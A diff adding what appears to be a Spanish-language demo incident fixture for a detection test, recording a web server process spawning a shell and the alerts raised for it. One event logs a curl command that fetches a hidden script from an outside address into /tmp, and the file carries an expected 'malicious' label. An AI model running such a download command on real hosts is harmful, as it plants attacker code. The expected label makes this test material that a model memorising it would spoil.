@@ -1,0 +1,54 @@
+{
+  "incidente_id": "INC-DEMO-0001",
+  "host": "web-01",
+  "segmento": "servicios",
+  "alertas": [
+    {
+      "alerta_id": "ALR-DEMO-0001",
+      "regla_id": "R-T1059-shell-desde-web",
+      "tecnica": "T1059",
+      "severidad": "alta",
+      "descripcion": "Proceso del servidor web lanzó un intérprete de comandos",
+      "eventos": ["EVT-DEMO-0001"]
+    },
+    {
+      "alerta_id": "ALR-DEMO-0002",
+      "regla_id": "R-T1105-descarga-desde-shell",
+      "tecnica": "T1105",
+      "severidad": "alta",
+      "descripcion": "Descarga de un archivo desde un shell hacia un destino fuera de la red",
+      "eventos": ["EVT-DEMO-0002", "EVT-DEMO-0003"]
+    }
+  ],
+  "eventos": [
+    {
+      "evento_id": "EVT-DEMO-0001",
+      "ts": "2026-11-13T14:02:11Z",
+      "host": "web-01",
+      "tipo": "proceso",
+      "datos": {"padre": "php-fpm", "proceso": "/bin/sh", "usuario": "www-data", "cmdline": "sh -c id; uname -a"}
+    },
+    {
+      "evento_id": "EVT-DEMO-0002",
+      "ts": "2026-11-13T14:02:14Z",
+      "host": "web-01",
+      "tipo": "proceso",
+      "datos": {"padre": "sh", "proceso": "/usr/bin/curl", "usuario": "www-data", "cmdline": "curl -s http://10.99.0.66:8080/x.sh -o /tmp/.x.sh"}
+    },
+    {
+      "evento_id": "EVT-DEMO-0003",
+      "ts": "2026-11-13T14:02:14Z",
+      "host": "web-01",
+      "tipo": "conexion",
+      "datos": {"ip_origen": "10.20.0.11", "ip_destino": "10.99.0.66", "puerto_destino": 8080, "protocolo": "tcp"}
+    },
+    {
+      "evento_id": "EVT-DEMO-0004",
+      "ts": "2026-11-13T14:02:15Z",
+      "host": "web-01",
+      "tipo": "archivo",
+      "datos": {"ruta": "/tmp/.x.sh", "operacion": "crear", "usuario": "www-data"}
+    }
+  ],
+  "etiqueta_esperada": "malicioso"
+}
